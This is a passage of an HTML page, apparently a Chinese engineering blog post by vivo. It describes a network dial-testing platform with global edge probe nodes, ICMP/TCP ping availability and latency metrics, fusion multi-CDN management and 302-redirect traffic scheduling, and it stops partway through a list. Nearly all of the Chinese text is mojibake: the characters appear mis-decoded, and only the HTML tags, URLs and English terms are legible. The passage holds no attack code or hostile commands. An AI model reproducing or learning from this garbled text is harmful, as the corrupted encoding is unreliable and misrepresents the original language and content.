<p>åœ¨è¿™åŸºç¡€èƒ½åŠ›ä¹‹ä¸Šä»¥åŠç»“åˆæœ¬æ¬¡åˆ†äº«çš„ä¸»é¢˜ï¼Œæˆ‘ä»¬å­µåŒ–äº†å¦å¤–ä¸€ç§åœºæ™¯-â€œç½‘ç»œè°ƒåº¦æ£€æµ‹â€ï¼Œæˆ‘ä»¬ä¼šæŒç»­åœ°å¯¹CDNã€æœºæˆ¿ã€è¿è¥å•†è¿™äº›åŸºç¡€é“¾è·¯è¿›è¡Œæ¢æµ‹å’Œåˆ†æï¼Œä¸€æ—¦å‘ç°é—®é¢˜ï¼Œå°±å¯ä»¥åŸºäºæ‹¨æµ‹æ•°æ®åŠ¨æ€è°ƒæ•´ç½‘ç»œç­–ç•¥ï¼Œä»¥å®ç°æµé‡å’Œæ•…éšœæ™ºèƒ½è°ƒåº¦ç›®çš„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e50b7897fb543898a0ab768e8b1a0a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=Lgbow8T8uIvEUvUAM6TBJTeXpts%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-4">2.3 vivoæ‹¨æµ‹çš„åŸç†ä»‹ç»</h3>
<p>äº†è§£äº†vivoè‡ªæœ‰èŠ‚ç‚¹è§„æ¨¡åï¼Œé‚£ä¹ˆæ‹¨æµ‹å¦‚ä½•å·¥ä½œçš„ï¼Ÿä¸‹é¢è¿™å¼ å›¾æ¸…æ™°å±•ç¤ºäº†vivoæ‹¨æµ‹ç³»ç»Ÿçš„åŸºæœ¬å·¥ä½œåŸç†ï¼Œå®ƒä¸»è¦åˆ†ä¸ºä¸‰æ­¥ï¼š</p>
<p><strong>ç¬¬ä¸€æ­¥ï¼Œä¸‹å‘æ‰§è¡Œæ¢æµ‹ä»»åŠ¡ã€‚</strong></p>
<p>å¹³å°ä¼šå‘åˆ†å¸ƒåœ¨å…¨çƒçš„è¾¹ç¼˜æ¢æµ‹èŠ‚ç‚¹ï¼Œä¸‹å‘æ¢æµ‹æŒ‡ä»¤ï¼Œæ¯”å¦‚å»è®¿é—®æŸä¸ªç½‘å€ï¼Œæˆ–è€…è®¿é—®æŸä¸€æ¥å£ï¼Œä¹Ÿæˆ–è€…ä¸‹è½½æŸä¸ªAPPç­‰ã€‚</p>
<p><strong>ç¬¬äºŒæ­¥ï¼Œæ•°æ®é‡‡é›†ä¸åˆ†æã€‚</strong></p>
<p>èŠ‚ç‚¹åœ¨æ‰§è¡Œä»»åŠ¡æ—¶ï¼Œä¼šæ”¶é›†ç½‘ç»œä¸¢åŒ…ç‡ï¼Œå“åº”æ—¶é—´ã€å¯ç”¨æ€§ç­‰æ€§èƒ½æ•°æ®ï¼Œå¹¶è¿›è¡Œå®æ—¶åˆ†æã€‚</p>
<p><strong>ç¬¬ä¸‰æ­¥ï¼Œé˜ˆå€¼å’Œå¯ç”¨æ€§å‘Šè­¦ã€‚</strong></p>
<p>å¦‚æœå‘ç°æ¢æµ‹ç»“æœè¶…å‡ºäº†æˆ‘ä»¬è®¾å®šçš„é˜ˆå€¼ï¼Œæ¯”å¦‚è®¿é—®è¶…æ—¶ã€ä¸å¯ç”¨ï¼Œæ£€æµ‹å‘Šè­¦ç³»ç»Ÿå°±ä¼šç«‹å³è§¦å‘å‘Šè­¦ï¼Œå¹¶å¯ä»¥è”åŠ¨ æ™ºèƒ½è°ƒåº¦ç­–ç•¥ è¿›è¡Œè‡ªåŠ¨å¤„ç†ï¼Œæ¯”å¦‚åˆ‡æ¢çº¿è·¯ï¼Œåˆ‡æ¢ç¾å¤‡æœºæˆ¿ï¼Œåˆ‡æ¢è¿è¥å•†ç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e89eaf89242e46debd394e817c63ee36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=OEFNevR5wIwDSKR%2FNHxvmCHiBMs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-5">2.4 vivoæ‹¨æµ‹èƒ½åŠ›ä»‹ç»-é‡‡é›†ä¾§</h3>
<p>ä¸ºäº†ç®¡ç†å¦‚æ­¤åºå¤§çš„èŠ‚ç‚¹ç½‘ç»œå¹¶æ‰§è¡Œå¤æ‚çš„ä»»åŠ¡ï¼Œæˆ‘ä»¬çš„æ‹¨æµ‹å¹³å°æ„å»ºå“ªäº›æŠ€æœ¯èƒ½åŠ›å‘¢ï¼Ÿå¤§å®¶å¯ä»¥çœ‹ä¸‹é¢è¿™å¼ æ¶æ„å›¾ï¼Œ</p>
<p>é¦–å…ˆã€åœ¨é‡‡é›†ä¾§ï¼Œæˆ‘ä»¬å…·å¤‡äº†ä»åº•å±‚çš„DNSè§£æã€TCPå»ºè”ï¼Œåˆ°ä¸Šå±‚çš„HTTPå¯ç”¨æ€§ã€ç§æœ‰åè®®ï¼Œå†åˆ°ç½‘é¡µé¦–å±ã€æµåª’ä½“ç­‰å…¨æ–¹ä½çš„ç”¨æˆ·ä½“éªŒæ£€æµ‹èƒ½åŠ›ã€‚</p>
<p>åŒæ—¶ï¼Œæˆ‘ä»¬å¯¹æ‰§è¡Œæ‹¨æµ‹èŠ‚ç‚¹çš„è€—ç”µï¼Œç½‘ç»œç¯å¢ƒï¼Œæ‰§è¡Œç­–ç•¥ï¼Œé…ç½®ç®¡æ§éƒ½åšäº†ç²¾ç»†åŒ–ç®¡ç† ä¿éšœé‡‡é›†çš„æ‹¨æµ‹æ•°æ®ç¨³å®šã€å¯ä¿¡ã€å¯åˆ†æï¼Œå¯åº¦é‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eddd95261e924db6982dce0c23e31959~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=ImDW83PP4%2BDYtn8IOhlFww7MrIc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-6">2.5 vivoæ‹¨æµ‹èƒ½åŠ›ä»‹ç»-å¹³å°ä¾§</h3>
<p>åœ¨å¹³å°ä¾§ï¼Œæˆ‘ä»¬åŒæ ·å…·å¤‡ä»»åŠ¡ç®¡ç†ã€é…ç½®ç®¡ç†ã€èŠ‚ç‚¹ç®¡ç†å’Œå‘Šè­¦èƒ½åŠ›ã€‚å¯ä»¥å®ç°å¤šç»´åº¦çš„ä»»åŠ¡ä¸‹å‘ï¼Œæ¯”å¦‚å¯ä»¥æŒ‰å›½å®¶ã€çœä»½ã€åŸå¸‚ã€åœ°åŒºã€è¿è¥å•†ã€æœºå‹ï¼Œç½‘ç»œç­‰ç»´åº¦ä¸‹å‘ã€‚</p>
<p>åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå…·å¤‡äº†åŠ«æŒï¼ŒCDNæ•…éšœç­‰åœºæ™¯çš„æ£€æµ‹å‘Šè­¦èƒ½åŠ›ã€ä»¥åŠå¼‚å¸¸å¿«ç…§ã€é“¾è·¯åˆ†æç­‰æ•…éšœåˆ†æèƒ½åŠ› ç¡®ä¿æ”¶é›†åˆ°çš„æ‹¨æµ‹æ•°æ®å¾—åˆ°å……åˆ†çš„åº”ç”¨ï¼ŒåŒæ—¶ç»è¿‡å¤§æ•°æ®åˆ†æå’ŒAIèƒ½åŠ›åŠ æŒï¼Œåšåˆ°ä¸šåŠ¡é—®é¢˜ ä¸€åˆ†é’Ÿå‘ç°ã€å³æ—¶å‘Šè­¦ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b3dba861ff84b5287dc15f934c9c1ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=l43nowEDNcxYLVGrsqqW2Evnm4g%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><em>vivoæ‹¨æµ‹å¹³å°å…è´¹ä½“éªŒåœ°å€ï¼š</em><a href="https://link.juejin.cn?target=https%3A%2F%2Fdial.vivo.com.cn%2F" target="_blank" title="https://dial.vivo.com.cn/" ref="nofollow noopener noreferrer"><em>https://dial.vivo.com.cn</em></a></p>
<h3 data-id="heading-7">2.6 æ‹¨æµ‹å¦‚ä½•æ”¯æ’‘æ™ºèƒ½æµé‡è°ƒåº¦</h3>
<p>å¦‚æ­¤æµ·é‡çš„æ‹¨æµ‹æ•°æ®ï¼Œç©¶ç«Ÿæ˜¯å¦‚ä½•æ”¯æ’‘æµé‡è°ƒåº¦çš„å‘¢ï¼Ÿ</p>
<p>ä¸‹é¢è¿™å¼ å›¾æ¸…æ™°å±•ç¤ºäº†å…¶å·¥ä½œåŸç†ã€‚</p>
<p><strong>é¦–å…ˆï¼Œæ˜¯â€œè¾“å…¥â€ç¯èŠ‚ã€‚</strong></p>
<p>IPå…ƒæ•°æ®ç®¡ç†å¹³å°ä¼šå°†å…¬ç½‘æœåŠ¡IPä¿¡æ¯åŒæ­¥åˆ°æ‹¨æµ‹å¹³å°ï¼Œå…¶ä¸­IPå…ƒæ•°æ®åŒ…å«6å¤§å…³é”®ç»´åº¦ï¼š</p>
<ol>
<li>
<p>IPä¿¡æ¯</p>
</li>
<li>
<p>å½’å±è¿è¥</p>
</li>
<li>
<p>å½’å±ä¸šåŠ¡</p>
</li>
<li>
<p>å½’å±æœºæˆ¿</p>
</li>
<li>
<p>å½’å±é›†ç¾¤</p>
</li>
<li>
<p>å½’å±IDC</p>
</li>
</ol>
<p><strong>å…¶æ¬¡ï¼Œæ˜¯â€œæ‰§è¡Œâ€ç¯èŠ‚ã€‚</strong></p>
<p>è¿™äº›å¸¦æœ‰å…ƒæ•°æ®çš„æœåŠ¡å…¬ç½‘IPä¿¡æ¯ï¼Œä¼šç”Ÿæˆå…·ä½“çš„â€œIPä»»åŠ¡â€ï¼Œé€šè¿‡â€œä»»åŠ¡è°ƒåº¦â€ç³»ç»Ÿï¼Œä¸‹å‘ç»™æˆ‘ä»¬éå¸ƒå…¨çƒçš„â€œè¾¹ç¼˜æ¢æµ‹èŠ‚ç‚¹â€ï¼Œæ‰§è¡Œæ¢æµ‹ä»»åŠ¡ã€‚</p>
<p><strong>æ¥ç€ï¼Œæ˜¯æ•°æ®åˆ†æå¤„ç†ç¯èŠ‚ã€‚</strong></p>
<p>æ¢æµ‹ç»“æœæ•°æ®ä¼šé€šè¿‡ç»Ÿä¸€ç½‘å…³å®æ—¶å­˜å…¥æ—¶åºæ•°æ®åº“ä¸­ï¼Œå…¶ä¸­ã€ç»“æœæ•°æ®åŒ…å«å››å¤§å…³é”®æŒ‡æ ‡ï¼š</p>
<ol>
<li>
<p>ICMP Ping å¯ç”¨æ€§</p>
</li>
<li>
<p>TCP Ping å¯ç”¨æ€§</p>
</li>
<li>
<p>ICMP Ping æ—¶å»¶</p>
</li>
<li>
<p>TCP Ping æ—¶å»¶</p>
</li>
</ol>
<p>è¿™äº›æŒ‡æ ‡ï¼Œæœ€ç»ˆæ„æˆäº†æ™ºèƒ½è°ƒåº¦çš„æ ¸å¿ƒæ•°æ®åŸºç¡€ã€‚</p>
<p><strong>æœ€åï¼Œå°±æ˜¯æµé‡æ™ºèƒ½è°ƒåº¦çš„åº”ç”¨ã€‚</strong></p>
<p>æœ‰äº†è¿™äº›ç²¾å‡†ã€å®æ—¶çš„æ•°æ®ï¼Œæˆ‘ä»¬å°±èƒ½èµ‹èƒ½ä¸€ç³»åˆ—ä¸Šå±‚çš„æ™ºèƒ½è°ƒåº¦åœºæ™¯ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>
<p>**æ•…éšœå¿«é€Ÿæ¢å¤ï¼š**ä¸€æ—¦æ‹¨æµ‹å‘ç°æŸä¸ªIPä¸å¯ç”¨ï¼Œè°ƒåº¦ç³»ç»Ÿå¯ä»¥ç§’çº§å°†å®ƒåˆ‡æ¢èµ°ã€‚</p>
</li>
<li>
<p>**æ•…éšœç²¾å‡†å®šä½ï¼š**æˆ‘ä»¬å¯ä»¥å¿«é€Ÿå®šä½åˆ°é—®é¢˜å‡ºåœ¨å“ªä¸ªåœ°åŸŸã€å“ªä¸ªè¿è¥å•†ï¼Œä»¥åŠå“ªä¸ªçº¿è·¯ã€‚</p>
</li>
<li>
<p>**æµé‡å¼‚å¸¸æ£€æµ‹ï¼š**é€šè¿‡æŒç»­çš„æ€§èƒ½æ•°æ®å¯¹æ¯”åˆ†æï¼Œå‘ç°æ½œåœ¨çš„æµé‡æ”»å‡»å’Œè´¨é‡æ¶åŒ– é£é™©ã€‚</p>
</li>
<li>
<p>**æµé‡æ™ºèƒ½è°ƒåº¦ï¼š**åŸºäºè´¨é‡å’Œæˆæœ¬ç›®æ ‡ï¼Œç»“åˆä¸šåŠ¡åœºæ™¯ã€åŠ¨æ€è°ƒæ•´æµé‡åˆ†é…ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c9dcb605115464b9dcff1f70871bee1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=%2FW62RIPZHhNGabGuUHwjlicBxLw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-8">ä¸‰ã€èåˆæµé‡ç®¡ç†</h2>
<h3 data-id="heading-9">3.1 æŠ€æœ¯èƒŒæ™¯</h3>
<p>vivoé‡‡ç”¨äº†è‡ªå»ºç§æœ‰äº‘å’Œå…¬æœ‰äº‘ç»“åˆçš„æ··åˆäº‘æ¶æ„ã€‚ç”¨æˆ·çš„è®¿é—®æµé‡ï¼Œä¼šé€šè¿‡DNSã€CDNã€è´Ÿè½½å‡è¡¡ç­‰ä¸€ç³»åˆ—ç½‘ç»œåŸºç¡€è®¾æ–½ï¼Œæœ€ç»ˆåˆ°è¾¾æˆ‘ä»¬çš„ä¸šåŠ¡æœåŠ¡ã€‚</p>
<p>è¿™ä¸ªæ¶æ„éå¸¸å…¸å‹ï¼Œä½†å®ƒä¹Ÿç»™æˆ‘ä»¬å¸¦æ¥äº†<strong>äº”å¤§æ ¸å¿ƒæŒ‘æˆ˜</strong>ã€‚</p>
<ul>
<li>
<p>**å¤æ‚æ€§ï¼š**å¤šè¿è¥å•†ã€å¤šCDNã€å¤šæœºæˆ¿ï¼Œç®¡ç†éš¾åº¦å·¨å¤§ã€‚</p>
</li>
<li>
<p>**æˆæœ¬å‹åŠ›ï¼š**å¸¦å®½è´¹ç”¨ï¼Œç‰¹åˆ«æ˜¯çªå‘æµé‡å¸¦æ¥çš„é¢å¤–å¼€é”€ï¼Œéå¸¸é«˜æ˜‚ã€‚</p>
</li>
<li>
<p>**è´¨é‡æŒ‘æˆ˜ï¼š**ä»»ä½•ä¸€ä¸ªç¯èŠ‚çš„ç½‘ç»œæ³¢åŠ¨ï¼Œéƒ½ä¼šå½±å“ç”¨æˆ·ä½“éªŒã€‚</p>
</li>
<li>
<p>**å®‰å…¨é£é™©ï¼š**å†…éƒ¨ä¸»åŠ¨ä¸Šç½‘å’Œå¤–éƒ¨æ”»å‡»ï¼Œéƒ½æ˜¯æ½œåœ¨çš„å¨èƒã€‚</p>
</li>
<li>
<p>**è¿ç»´æ•ˆç‡ï¼š**ç¼ºä¹ç»Ÿä¸€è§†å›¾å’Œè‡ªåŠ¨åŒ–èƒ½åŠ›ï¼Œæ’éšœå’Œå˜æ›´æ“ä½œå°†éå¸¸è€—æ—¶ã€‚</p>
</li>
</ul>
<p>é¢å¯¹è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜ç¡®ï¼šå°±æ˜¯è¦æ„å»ºä¸€ä¸ªæ™ºèƒ½ã€é«˜æ•ˆã€å®‰å…¨çš„ä¸€ä½“åŒ–è§£å†³æ–¹æ¡ˆï¼Œæœ€ç»ˆå®ç°é™æˆæœ¬ã€æè´¨é‡ã€å¼ºå®‰å…¨ã€ææ•ˆç‡ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/247fce4d43ae427796dc06984aadc583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=nknX%2BOj48Ib%2F9HuNWxk4c8t1HpM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¸ºäº†å®ç°è¿™äº›ï¼Œå¹³å°è½åœ°ä¸ºä¸€ç³»åˆ—å…·ä½“çš„è§£å†³æ–¹æ¡ˆï¼Œæ¯”å¦‚ï¼šé€šè¿‡DNSåŸŸåè§£æã€CDNåŠ é€Ÿæ¥å…¥æ¥ç»Ÿä¸€æµé‡å…¥å£ï¼›é€šè¿‡302æ™ºèƒ½è°ƒåº¦ã€æœºæˆ¿å¸¦å®½è°ƒåº¦æ¥å®ç°æ™ºèƒ½å†³ç­–ï¼›é€šè¿‡WAFæ‹¦æˆªã€å¤–å‘æµé‡æ£€æµ‹æ¥ä¿éšœå®‰å…¨ï¼›å¹¶é€šè¿‡å…¨é“¾è·¯ç›‘æ§å’Œæ•…éšœé¢„æ¡ˆæ¥å®ç°è‡ªåŠ¨åŒ–è¿ç»´ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76e621d11b5545f9b7841c216cad6969~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=Lc2kj5q%2BMlZdUIhjdjjFg6MQTp4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-10">3.2 å¹³å°å®è·µ</h3>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬æ˜¯å¦‚ä½•åšçš„å‘¢ï¼Ÿ</p>
<p>ä¸‹é¢æ˜¯å¹³å°çš„æ•´ä½“æŠ€æœ¯æ¶æ„ï¼Œå®ƒæ˜¯ä¸€ä¸ªå…¸å‹çš„åˆ†å±‚æ¶æ„ã€‚</p>
<ul>
<li>
<p><strong>æœ€åº•å±‚</strong>æ˜¯<strong>ç½‘ç»œèµ„æº</strong>ï¼ŒåŒ…æ‹¬äº†æˆ‘ä»¬å¯¹æ¥çš„DNSã€CDNã€æœºæˆ¿ç½‘ç»œç­‰æ‰€æœ‰ä¾›åº”å•†ã€‚</p>
</li>
<li>
<p>å¾€ä¸Šæ˜¯<strong>æ•°æ®é‡‡é›†å±‚</strong>ï¼Œå®ƒä¼šä»æœºæˆ¿ã€CDNã€ä¸šåŠ¡åŸ‹ç‚¹ã€æ‹¨æµ‹ç³»ç»Ÿç­‰å„ä¸ªæºå¤´ï¼Œå…¨é¢åœ°é‡‡é›†æµé‡ã€æ—¥å¿—å’Œç›‘æ§æŒ‡æ ‡æ•°æ®ã€‚</p>
</li>
<li>
<p>æ•°æ®ä¹‹ä¸Šï¼Œæ˜¯<strong>æ•°æ®å¤„ç†ä¸åˆ†æå±‚</strong>ï¼Œæˆ‘ä»¬ä½¿ç”¨å¤§æ•°æ®å¹³å°å¯¹æ•°æ®è¿›è¡Œå®æ—¶å’Œç¦»çº¿å¤„ç†ï¼Œå¹¶åˆ©ç”¨è°ƒåº¦å’Œæ£€æµ‹ç®—æ³•ï¼Œæ¥æŒ–æ˜æ•°æ®èƒŒåçš„ä»·å€¼ã€‚</p>
</li>
<li>
<p>æ¶æ„çš„æ ¸å¿ƒæ˜¯<strong>æ§åˆ¶ä¸æ‰§è¡Œå±‚</strong>ï¼Œå®ƒé€šè¿‡APIç½‘å…³å’Œè‡ªåŠ¨åŒ–ç¼–æ’èƒ½åŠ›ï¼Œå»å®é™…åœ°é…ç½®å’Œè°ƒåº¦åº•å±‚çš„ç½‘ç»œèµ„æºã€‚</p>
</li>
<li>
<p>æœ€ä¸Šå±‚æ˜¯<strong>å±•ç°ä¸äº¤äº’å±‚</strong>ï¼Œé€šè¿‡ä¸€ä¸ªç»Ÿä¸€çš„ç®¡ç†é—¨æˆ·ï¼Œé¢å‘ä¸šåŠ¡å’Œè¿ç»´äººå‘˜ï¼Œæä¾›æ¥å…¥ã€ç®¡æ§ã€æŠ¥è¡¨ç­‰ä¸€ç³»åˆ—æœåŠ¡ã€‚</p>
</li>
</ul>
<p>é€šè¿‡è¿™ä¸ªæ¶æ„ï¼Œæˆ‘ä»¬å°†å¤æ‚çš„æµé‡ç®¡ç†å·¥ä½œï¼Œå¹³å°åŒ–ã€ç³»ç»ŸåŒ–äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/269211f9db6749f5b852a1f424b594df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=JIJTbg8uOga54kaUG%2FBSAZhx%2Buo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-11">3.2.1 å¤šCDNç»Ÿä¸€æ¥å…¥çº³ç®¡</h4>
<p>æˆ‘ä»¬æ·±å…¥åˆ°å…·ä½“çš„å®è·µåœºæ™¯ã€‚</p>
<p>é¦–å…ˆæ˜¯<strong>CDNçš„æ²»ç†</strong>ã€‚</p>
<p>æˆ‘ä»¬æ‰“é€ çš„â€œèåˆCDNâ€å¹³å°ï¼Œæ ¸å¿ƒä»·å€¼ä½“ç°åœ¨å…­ä¸ªæ–¹é¢ï¼š</p>
<ul>
<li>
<p>**é…ç½®èåˆï¼š**ç»Ÿä¸€äº†ä¸åŒå‚å•†çš„é…ç½®æ ‡å‡†ï¼Œå¤§å¤§æå‡äº†ç®¡ç†æ•ˆç‡ã€‚</p>
</li>
<li>
<p>**æµé‡è°ƒåº¦ï¼š**æ”¯æŒå¤šç§ç­–ç•¥ï¼Œè®©è°ƒåº¦æ—¢ç²¾å‡†åˆçµæ´»ã€‚</p>
</li>
<li>
<p>**æ•°æ®èåˆï¼š**åœ¨ä¸€ä¸ªå¹³å°å°±èƒ½çœ‹åˆ°æ‰€æœ‰å‚å•†çš„æ•°æ®æŒ‡æ ‡ã€‚</p>
</li>
<li>
<p>**æˆæœ¬ä¼˜åŒ–ï¼š**é€šè¿‡ä¸€ç³»åˆ—è¿è¥æ‰‹æ®µï¼Œæˆ‘ä»¬æˆåŠŸå°†æˆæœ¬é™ä½äº†30%ã€‚</p>
</li>
<li>
<p>**ç§’çº§å®¹ç¾ï¼š**åŸºäºå…¨ç½‘æ‹¨æµ‹ç‚¹çš„è´¨é‡æ„ŸçŸ¥ï¼Œä¸€æ—¦å‘ç”Ÿæ•…éšœï¼Œå¯ä»¥è‡ªåŠ¨è°ƒåº¦ï¼Œå®ç°ç§’çº§å®¹ç¾ã€‚</p>
</li>
<li>
<p>**æ™ºèƒ½è¿ç»´ï¼š**åŒæ ·åŸºäºæ‹¨æµ‹èŠ‚ç‚¹ï¼Œå¯ä»¥æ™ºèƒ½åœ°è¿›è¡Œæ•…éšœçš„æ ¹å› å®šä½ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b50d7933b19747f0ba6c60a316fc8411~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=82NUvxu3EerHuoqh7wPUaqAC8f0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-12">3.2.2 èåˆCDNäº§å“æ¶æ„</h4>
<p>ä¸‹é¢è¿™å¼ æ¶æ„å›¾å±•ç¤ºäº†æˆ‘ä»¬å¦‚ä½•å®ç°è¿™äº›ä»·å€¼ã€‚å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªâ€œèåˆCDNç®¡ç†å¹³å°â€ï¼ŒæŠŠå…¨çƒä¸»æµCDNå‚å•†çš„APIéƒ½æ¥å…¥è¿›æ¥ï¼Œå±è”½äº†åº•å±‚çš„å·®å¼‚ã€‚</p>
<p>å¯¹äºä¸šåŠ¡æ–¹æ¥è¯´ï¼Œä»–ä»¬åªéœ€è¦é€šè¿‡æˆ‘ä»¬ç»Ÿä¸€çš„æ§åˆ¶å°æˆ–OpenAPIè¿›è¡Œæ“ä½œã€‚åŒæ—¶ï¼Œå¹³å°é›†æˆäº†æˆ‘ä»¬çš„ç«¯ä¾§è´¨é‡åŸ‹ç‚¹ã€æ™ºèƒ½è§£æã€302æ™ºèƒ½è°ƒåº¦ç­‰æ ¸å¿ƒèƒ½åŠ›ï¼Œå½¢æˆäº†ä¸€ä¸ªå¼ºå¤§çš„è°ƒåº¦ä¸­å¿ƒï¼Œä¸ºç”¨æˆ·æä¾›æœ€ä¼˜çš„åŠ é€Ÿä½“éªŒã€‚</p>
<p>åœ¨èåˆCDNä¸­ï¼Œ302æ™ºèƒ½è°ƒåº¦æ˜¯æˆ‘ä»¬æœ€æ ¸å¿ƒã€æœ€æœ‰ä»·å€¼çš„èƒ½åŠ›ä¹‹ä¸€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8877ebdbdecc497f8e000ca84f6c31ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=sOv0JUkT5Hd%2FfZjhOgs%2BAH0mUuE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¦‚å›¾ï¼Œå³ä½¿æ˜¯åœ¨åŒä¸€ä¸ªåœ°åŒºï¼Œä¸åŒçš„CDNå‚å•†ï¼Œåœ¨åŒä¸€æ—¶é—´çš„ä¸‹è½½é€Ÿåº¦ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚è“è‰²çš„çº¿å¯èƒ½åœ¨æŸä¸ªå°æ—¶æœ€å¿«ï¼Œä½†ä¸‹ä¸€ä¸ªå°æ—¶ï¼Œä¹Ÿè®¸ç»¿è‰²çš„çº¿å°±åè¶…äº†ã€‚</p>
<p>è¿™å°±å¸¦æ¥ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ï¼šæˆ‘ä»¬å¦‚ä½•ä¿è¯æˆ‘ä»¬çš„ç”¨æˆ·ï¼Œæ€»èƒ½ç”¨åˆ°å½“ä¸‹é‚£ä¸ªæœ€å¿«çš„CDNå‘¢ï¼ŸåŒæ—¶ï¼Œå½“æŸä¸ªå‚å•†å‡ºç°æ•…éšœæ—¶ï¼Œæˆ‘ä»¬åˆå¦‚ä½•å¿«é€Ÿåœ°æŠŠç”¨æˆ·åˆ‡æ¢èµ°ï¼Œå®ç°å®¹ç¾å‘¢ï¼Ÿè¿™å°±æ˜¯302æ™ºèƒ½è°ƒåº¦è¦è§£å†³çš„é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b727443cd8334ee0aac886f60beb0be6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=7lQaA0B1CGAzYJmp0Vzq73V8tmA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-13">3.2.3 302æ™ºèƒ½è°ƒåº¦</h4>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è®¾è®¡äº†è¿™å¥—æŠ€æœ¯æ–¹æ¡ˆã€‚å®ƒéå¸¸å·§å¦™ï¼Œä¸»è¦åˆ†ä¸ºå››æ­¥ï¼š</p>
<ul>
<li>
<p><strong>ç¬¬ä¸€æ­¥ï¼Œå®¢æˆ·ç«¯</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ä¸šåŠ¡æœåŠ¡ç«¯ï¼Œåœ¨å“åº”ç”¨æˆ·è¯·æ±‚æ—¶ï¼Œå®ƒä¸ä¼šç›´æ¥è¿”å›ä¸€ä¸ªå†™æ­»çš„ä¸‹è½½åœ°å€ã€‚</p>
</li>
<li>
